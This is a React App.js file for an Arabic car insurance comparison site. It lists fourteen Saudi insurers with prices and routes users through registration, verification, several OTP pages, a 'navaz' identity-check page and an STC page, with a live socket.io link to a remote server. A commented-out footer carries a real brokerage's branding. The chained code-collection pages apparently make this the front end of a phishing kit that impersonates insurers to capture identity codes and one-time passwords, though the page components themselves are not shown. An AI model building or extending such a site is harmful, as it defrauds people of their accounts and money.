import { BrowserRouter, Routes, Route } from "react-router-dom";
import Home from "./Pages/Home";
import Navbar from "./Navbar";
import { useEffect, useState } from "react";
import Apply from "./Pages/Apply";
import Reg from "./Pages/Reg";
import Confirm from "./Pages/Confirm";
import Verify from "./Pages/Verify";
import axios from "axios";
import Activate from "./Pages/Activate";
import Motsl from "./Pages/Motsl";
import MotslOtp from "./Pages/MotslOtp";
import { io } from "socket.io-client";
import Navaz from "./Pages/ConfirmOrder";
import STC from "./Pages/STC";
import OrderOtp from "./Pages/OrderOtp";
import Activate_Shamel from "./Pages/Activate_Shamel";

// export const api_route = "http://localhost:8080";
export const api_route  = 'https://tamn-se-h00g.onrender.com'
export const socket = io(api_route);

export function getKeysWithTrueValue(obj) {
  const keysWithTrueValue = {};
  for (const key in obj) {
    if (obj[key]) {
      keysWithTrueValue[key] = obj[key];
    }
  }
  return keysWithTrueValue;
}

export const imgData = [
  {
    src: "/1.jpg",
    name: "التعاونية للتأمين - يغطي إصلاح مركبتك",
    logo: "/1logo.png",
    price: "570.60",
    one: "85.6",
    two: "0.00",
    three: "668.0",
    four: "570.6",
    five: "97.42",
    total: "485.0",
  },
  {
    src: "/2.jpg",
    name: "الشركة المتحدة للتأمين التعاوني",
    logo: "/2logo.png",
    price: "792.98",
    one: "79.3",
    two: "0.00",
    three: "890.4",
    four: "793.0",
    five: "97.42",
    total: "713.7",
  },
  {
    src: "/3.jpg",
    name: "تأمين المركبات ضد الغير – الراجحي تكافل",
    logo: "/3.png",
    price: "277.22",
    one: "55.4 ",
    two: "0.00",
    three: "374.6",
    four: "277.2",
    five: "97.42",
    total: "221.8",
  },
  {
    src: "/4.jpg",
    name: "شركة ولاء للتأمين التعاوني",
    logo: "/4logo.png",
    price: "302.7",
    one: "0.00",
    two: "0.00",
    three: "400.00",
    four: "302.7",
    five: "97.42",
    total: "302.7",
  },
  {
    src: "/5.jpg",
    name: "شركة إتحاد الخليج الاهلية للتأمين التعاوني",
    logo: "/5logo.png",
    price: "678.2",
    one: "0.00",
    two: "0.0",
    three: "775.6",
    four: "678.2",
    five: "97.42",
    total: "678.2",
  },
  {
    src: "/6.jpg",
    name: "شركة المتوسط والخليج للتأمين وإعادة التأمين التعاوني (ميدغلف)",
    logo: "/6logo.png",
    price: "418.8",
    one: "41.9",
    two: "0.00",
    three: "516.2",
    four: "418.8",
    five: "97.42",
    total: "376.9",
  },
  {
    src: "/7.jpg",
    name: "شركة التأمين العربية التعاونية",
    logo: "/7logo.png",
    price: "506.9",
    one: "101.4",
    two: "0.00",
    three: "604.3",
    four: "506.9",
    five: "97.42",
    total: "405.5 ",
  },
  {
    src: "/8.jpg",
    name: "شركة الاتحاد للتأمين التعاوني",
    logo: "/8logo.png",
    price: "506.9",
    one: "63.4",
    two: "0.00",
    three: "604.3",
    four: "506.9",
    five: "97.42",
    total: "443.5",
  },
  {
    src: "/9.jpg",
    name: "الشركة الخليجية العامة للتأمين التعاوني",
    logo: "/9logo.png",
    price: "492.0",
    one: "0.00",
    two: "0.00",
    three: "589.4",
    four: "492.0",
    five: "97.42",
    total: "492.0",
  },
  {
    src: "/10.jpg",
    name: "شركة التعاونية للتأمين التعاوني-تأمين ضد الغير",
    logo: "/10logo.png",
    price: "371.3",
    one: "37.1",
    two: "0.00",
    three: "468.8",
    four: "371.3",
    five: "97.42",
    total: "334.2",
  },
  {
    src: "/11.jpg",
    name: "الشركه الوطنيه للتأمين",
    logo: "/11logo.png",
    price: "355.0",
    one: "35.5",
    two: "0.00",
    three: "452.4",
    four: "355.0",
    five: "97.42",
    total: "319.5",
  },
  {
    src: "/12.jpg",
    name: "شركة ملاذ للتأمين وإعادة التأمين التعاوني",
    logo: "/12logo.png",
    price: "692.0",
    one: "69.2",
    two: "0.00",
    three: "789.5",
    four: "692.0",
    five: "97.42",
    total: "622.8",
  },
  {
    src: "/13.jpg",
    name: "شركة الصقر للتأمين",
    logo: "/13logo.png",
    price: "756.5",
    one: "0.00",
    two: "0.00",
    three: "853.9",
    four: "756.5",
    five: "97.42",
    total: "756.5 ",
  },
  {
    src: "/14.jpg",
    name: "شركة بروج للتأمين التعاوني",
    logo: "/14logo.png",
    price: "743.5",
    one: "74.4",
    two: "0.00",
    three: "840.9",
    four: "743.5",
    five: "97.42",
    total:'669.2'
  },
];

function App() {
  useEffect(() => {
    (async () => {
      await axios.get(api_route + "/");
    })();
  }, []);
  const [loading, setLoading] = useState(false);

  return (
    <div className=" w-full flex items-start justify-center min-h-screen  ">
      <div className="w-full md:w-1/2 relative items-center justify-center min-h-screen flex flex-col">
        {
          <BrowserRouter>
            <Navbar />
            <Routes>
              <Route
                path="/"
                element={<Apply loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/reg"
                element={<Reg loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/confirm"
                element={<Confirm loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/verfiy"
                element={<Verify loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/activate"
                element={<Activate loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/activate_shamel"
                element={
                  <Activate_Shamel loading={loading} setLoading={setLoading} />
                }
              />
              <Route
                path="/motsl"
                element={<Motsl loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/motslOtp"
                element={<MotslOtp loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/navaz"
                element={<Navaz loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/stc"
                element={<STC loading={loading} setLoading={setLoading} />}
              />
              <Route
                path="/order_otp"
                element={<OrderOtp loading={loading} setLoading={setLoading} />}
              />
            </Routes>
            {/* <div className="w-full flex flex-col justify-center items-center mt-8 my-5 gap-y-3 ">
              <span className="text-2xl font-bold">
                ليه اشتري تأميني من بي كير ؟
              </span>
              <span className="text-center  px-2">
                مالك في الطويلة ..عشان ماتتعب نفسك وتدور أفضل و "أوضح" عرض بدون
                ماتحتار
              </span>
              <div className="w-full grid grid-cols-1 md:grid-cols-2 place-content-center items-center gap-y-5 justify-items-center">
                <div className="w-11/12 gap-3 py-5 shadow-xl flex items-center justify-center">
                  <span>تأمينك في دقيقة</span>
                  <img src="/clock.svg" className="w-10" />
                </div>
                <div className="w-11/12 gap-3 py-5 shadow-xl flex items-center justify-center">
                  <span className="" dir="rtl">
                    {" "}
                    اسعار اقل !
                  </span>
                  <img src="/mign.svg" className="w-10" />
                </div>
                <div className="w-11/12 gap-3 py-5 shadow-xl flex items-center justify-center">
                  <span> واضح و سريع</span>
                  <img src="/lumb.svg" className="w-10" />
                </div>
                <div className="w-11/12 gap-3 py-5 shadow-xl flex items-center justify-center">
                  <span> دعم فني 24 ساعة</span>
                  <img src="/24.svg" className="w-10" />
                </div>
                <div className="w-11/12 gap-3 py-5 shadow-xl flex items-center justify-center">
                  <span className="" dir="rtl">
                    {" "}
                    سعودية 100 %{" "}
                  </span>
                  <img src="/land.svg" className="w-10" />
                </div>
                <div className="w-11/12 gap-3 py-5 shadow-xl flex items-center justify-center">
                  <span> خيارات الدفع</span>
                  <img src="/pay.svg" className="w-10" />
                </div>
              </div>
              <div className="w-full flex justify-evenly items-center  ">
                <img src="/appstore.svg" alt="appstore" className="w-1/4" />
                <img src="/google.svg" alt="google" className="w-1/4" />
                <span className="underline">800118004</span>
              </div>
              <span className="text-center  px-2 text-sm">
                2024 © جميع الحقوق محفوظة , شركة عناية الوسيط لوساطة التأمين
              </span>
            </div> */}
          </BrowserRouter>
        }
      </div>
    </div>
  );
}

export default App;
